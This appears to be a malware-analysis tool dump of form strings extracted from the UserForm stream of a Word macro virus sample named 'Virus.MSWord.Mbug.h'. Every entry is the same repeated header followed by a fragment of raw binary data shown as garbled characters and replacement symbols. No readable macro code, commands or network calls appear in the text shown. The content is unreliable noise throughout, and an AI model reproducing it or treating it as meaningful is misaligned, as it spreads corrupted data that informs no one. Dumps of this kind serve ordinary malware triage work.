- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3.DB9BB9BJBBB9BB9BJBB9)9999F-=B9BB9BJBBJBBJBBJBBJBBZKURBBZKURBBZKUJBBOGGOGGZKURBJBBR99JB9B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1-X1)BJ9RBBRZKUOGGOGGZKUOGGZKUZKUJBBOGGOGGB9BBB9;+;���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!J9R���ܴ�������a[~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Jt_�������ƫ���ˮ��RcsPZmJJZ5:k41l19c!1k%-s)5k%)o!1k%-s)5k##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B'1Y.D�##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`.D�FV�DL�FV�9L�.D�&-�&-�.?�1E�1E�DL�DL���޵��µ茅�fs�fs�ai~}��fs�'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^##X1)B99JJBBJBBJBBB9BJBBB9B9)9B9BJBBB9BJBBJBBJBBOGGOGGZKUJBBOGGZKUOGGOGGZKUOGGOGGJJRBBRB/V1)B!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N##X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=B/V99JJ9ROGGNPTRBJOGGOGGZKUJJRZKUJBBJBBJBB9)9H/?���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)B���ӻ����������dt�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Jt_�ӻ�iiqsx��~��~�BMk19J19c4En)Bo)5k41l%-s)5k)5k)5k!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`##X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X##X%)o%)o%-s%-s.?�9I�DL�FV�FV�DL�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D!1k&-�1E�9L�FV�FV�1E�DL�FV�DL�9L�DL�N]�~�ϵ��̹�µ�~��dt�~��}�����LY�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1)B1)BBBRB9BJBBB9BB9BF-=F-=F-=B9BB9BJBBJBBRBJOGGOGGZKUOGGRBBZKUJBBOGGOGGOGGOGGOGGZKUJBJ99J1)B1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1)B19JJ9RBBRRBJOGGOGGNPTZKURBJNPTRBJOGGOGGJBB9)9;;;���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=ܴ����������������99{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZB=k���ƫ͖~�[ZlPZmiiqiiqJJZ9Fc19J##X%)o%-s)5s)5s)5s!1k)5k'1Y%)o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`)5s.D�1E�FV�N]�ew�ew�DL�GF�)5k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`.3~1E�9L�FV�DL�N]�Xe�N]�ew�ew�ew�`b�~�ϵ��̹���൯�~�ό����ʌ�����ai~9Fc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D99J9)9B9JB9BB9BJBB9999)9999B9BJBBJBBJBBJBBOGGOGGZKUJBBZKUJBBRBBZKUJBBOGGOGGOGGNPTBBRB/V1)B1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N##X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=B/VB/VJBBNPTOGGOGGOGGOGGOGGZKUZKUOGGOGGJBBB9B;;;���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1!!3#)%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!))!3#)3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!BBR���ܴ��������~����}��%)o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NGF�t_�ai~}r���iiqiiqiiqLY�[Zl[Zl>FX>FX'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N'1Y%)o)5s%-s)5s)Bo%)o)5k'1Y%)o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z##X##X%-s.D�9I�1E�DL�9L�9I�!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z%)o.3~1E�FV�DL�FV�ew�iu�iu�~��~�ϔ�ޣ��µ�������޸�µ赯�~�������ছ�~��}��PZm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N##X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X99J999B9BB9B9)9999F-=F-=BB9B9BJBBJBBJBBOGGOGGOGGZKURBJZKURBBZKUOGGRBBZKUOGGZKU<<?BBRBBR1)B1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1-X1)BBBRBBRJJRRBJOGGNPTOGGOGGNPTZKURBJOGGJBBB9B;+;���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)9)9<.<=-1<.<9)9=-13.+!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)JJZ���������������������dt�%-s9I����fs�PZm^Rc99J9Fc�o�iiqPZmcZkJJR3=T'1Y'1Y'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^%-s.3~)Bo19c)Bo%-s)5s%-s!1k'1Y!1k##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^!1k!1k+)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~!1k!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`!1k&-�.D�DL�ew�iu�iu�~�ϔ�ޔ�ޣ�ࣟ�̹���������������裟൯�ƫͰ�ʌ��}��������BMk#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=##X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J99J999B9B1)B<.<B9B9)9B9BJBBJBBJBBOGGOGGZKURBJZKURBBR9BZKURBBOGGOGGOGGOGGOGGJBJBBR?9W'1Y1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3=TB/VJ9RBBROGGOGGOGGRJJOGGRJJOGGZKUZKURBJJBBJBBD;D���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=-1JBBRBBZKUJBJOGGRBB9)93#)%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99J���������ӻ������ަ��}��������RcsPZmJJR3=TPZmkkai~kkJJZ>FX>FX1-X'1Y!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J'1Y%-s.D�.D�.D�9I�&-�9I�+)�%-s+)�.3~%-s)5s%-s.3~%-s)5s!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^##X!1k'1Y%)o.?�9L�1E�iu͔�ޔ�ޣ��µ�µ赯ⵯ�̹�������������������µ�̹���ன�ai~LY����Rcs'1Y##X##X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1)B99JB9BB9BB9BB9B999F-=999B9BJBBJBBOGGOGGOGGOGGOGGOGGZKUZKURBBZKUJBBOGGOGGOGGOGGJBJBBR99J1)B'1Y)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X9)9BBRB/VJBJRBBOGGOGGOGGRJJOGGOGGNPTZKUOGGOGGJBBLDD���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!<.<OGGZKUZKUkVcZKUZKUJ99=-1!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!))!)!)3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)���������������������ӻ���˕��ai~3=T>FXBMk?9Wa[~wos[ZlJJZ3=T>FX'1Y19J'1Y##X'1Y%)o9I�9I�.3~9I�1E�9I�.D�1E�9I�&-�9I�9I�9I�AK�DL�K[�9L�.D�1E�1E�9L�DL�ew�{{Ҕ�޵��µ�µ�µ����µ�µ�������������������µ�̹�µ谧ʦ��LY�LY�fs�dt�fs�99J##X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X1)BB9BB9B1)B9999)9B9BB9BJBBJBBJBBOGGOGGOGGOGGOGGOGGZKUOGGOGGRBBZKUOGGOGGOGGOGGBBRBBRB9J1)B1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B1)B99JJBBN?VNPTOGGOGGOGGOGGOGGRJJNPTOGGOGGRBJJBBLDD���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1!!9)9OGG^Rck^gxcsskceYVZKU=-13#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)3#)=-13#)<.<<.<9)9))!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�~�������ӻ���������������ɦ��ai~19c?9W>FX3=TPZm���iiq>FX9FcB/V'1Y'1Y#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N%)o.?�9I�.?�9I�1E�1E�9L�9I�1E�9L�DL�1E�Xe�Xe�N]�ew�N]�ew�ew�iu�~�����µ�µ�µ����µ����������µ�������������������޸�̹䵯Ⱗ�~��}��dt�fs�}�����PZm#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=##X1-X3.D99JB9BB9B9)9B9BJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGOGGZKURBJZKURBBZKUJBBOGGOGGOGGJBB?9W19J1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=F)FJBBOGGOGGRJJOGGRJJOGGJBBOGGOGGOGGRJJOGGOGGLDD���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)9)9RJJk^gsem�mnsZcsemZKUJ991%1!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)B9BB9BJBBJBBJBBJBB9993#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)9)9�o�������ӻ�������������ܴ����sx�JJZ3=T>FXNPTBMkiiqai~3=T>FX>FX9Fc1)B1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J.3~.?�&-�9I�9L�1E�9I�1E�1E�9L�FV�FV�FV�N]�ew�ew�iu�~�ϔ�ޞ�ֵ��̹�̹�̹�������������µ�µ����������������������̹䵯�dt�K[����}��]i�]i����iiq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B99JB9BB9BB9BJBBB9BJBBJBBJBBOGGOGGOGGOGGOGGRBBZKURBBZKURBBZKURBBZKUJBBOGGOGGJBJB/V1)B1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)BB9BB9BJJROGGOGGRJJOGGOGGJBBOGGOGGOGGOGGRJJJBBLDD���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)9=-1OGGsem�mn�mnwosk^geYVJBB=-1)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1!!9)9NPTZKUZKUZKUZKUOGGJ993.+)!)199�~�ӻ�������ӻ�������������kk���k^g19cBMkai~3=T1)B>FX>FX19J99J99J99J1)B'&D'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^%-s.D�1E�1E�&-�9I�.D�1E�1E�9L�9L�DL�FV�N]�iu�~��~��~�ϣ�൯�̹�̹�̹����µ����������̹����������������������̹䁉�9I�dt�}��]i�RcsLY�ai~BMk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B1-X1)B1)B99JB9BB9BB9BB9BB9BJBBJBBJBBJBBNPTOGGZKUOGGZKURBBOGGZKUZKURBBJBBOGGOGGJBBOGGJBJBBR1)B1)B##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!11)B1)BB9BJBBOGGOGGOGGRJJOGGOGGOGGJBBJBBOGGOGGRJJQII���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1!!F-=OGGk^gsem�mnskck^geYVR9B=-1)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!9)9B9BJJR^Rck^gk^gkVcZKUOGG9993#))!)t_����ƫ�ܴ������������ɮ��sx����um�'&D1-XPZm[Zl9Fc1-X3=T'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N%)o)5k.?�9I�.D�9I�&-�9L�9I�9L�9L�1E�FV�N]�DL�ew�iu�~�ϔ�ޞ�ֵ��µ����̹�̹����������������������������������̹�µ�]i�)BoLY�ai~Rcs5:k3=T5:k>FX'1Y#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B3.D99J9)9B9JB9BJBBJBBJBBJBBJBBOGGOGGOGGOGGRJJOGGZKUZKURBJZKUOGGZKUOGGOGGOGGJBBJBJBBR99J1-X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91)BB9BB9BOGGJJROGGOGGOGGOGGJBBOGGOGGOGGOGGOGGOGGQII���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!<.<JBBeYVkVcsemsZckVcZKUB9B=-1!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)B9BZKUk^gk^g�mnk^gk^gZKUJBB=-1!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)B���ӻ�ƫ������������⮩����������ai~19J9Fckk[Zl>FX99J1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=)%91-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N'1Y%-s.3~.?�.D�&-�1E�9L�9L�9L�1E�K[�9L�FV�N]�ew�iu�~��~�ϣ�൯�µ�̹�µ�̹����������������̹����������µ�µ����~��1-X3=T19c19c9Fc9FcLY�RcsLY�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D1)B1)B<.<B9BB9BB9BJBBJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGZKUJBBZKUOGGJBBOGGOGGOGGOGGJBBJBJ99JB/V19J!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91)B1)BB9BJBBOGGNPTRJJOGGOGGOGGJBBJBBOGGOGGNPTOGGQII���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)B9BOGGZKUZKUeYVRBJR9B991)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'3#)B9BZKUk^gsemwoswosk^geYVOGGB9B3.+!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!cRk���ܴ����ӻ�ӻ�������~�����������9Fc19JLHk[ZlPZmB9J1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X19c%-s.?�.?�.D�1E�9L�9L�1E�FV�FV�K[�DL�N]�ew�iu�iu�~�ϙ�۞�ְ�ʣ�����µ�̹����������������̹�̹�̹�̹䵯⣟�]i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N19J19c9FcLY�K[�}��}��BMk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=##X<.<B9BB9BB9BJBBJBBB9BJBBJBBJBBJBBOGGOGGOGGOGGOGGNPTZKUJBBOGGZKUJBBOGGOGGJBBJBBBBRBBR1)B1)B##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)%99)9B9BOGGRBBOGGOGGOGGRJJJBBJBBJBBJBBOGGOGGOGGQII���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)9)9RBBJBBJBBJBBF-=3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!=-1JBBZKUk^gsem�mn{qik^gk^gOGGB9B3#)%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
